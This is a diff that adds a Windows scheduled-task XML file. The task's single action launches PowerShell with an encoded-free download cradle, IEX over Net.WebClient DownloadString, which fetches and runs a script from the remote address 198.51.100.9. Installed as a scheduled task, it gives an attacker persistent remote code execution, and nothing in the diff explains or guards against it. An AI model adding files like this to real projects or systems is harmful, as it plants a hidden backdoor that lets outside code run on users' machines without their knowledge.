@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <Actions Context="Author">
+    <Exec>
+      <Command>powershell.exe</Command>
+      <Arguments>-c "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/a')"</Arguments>
+    </Exec>
+  </Actions>
+</Task>
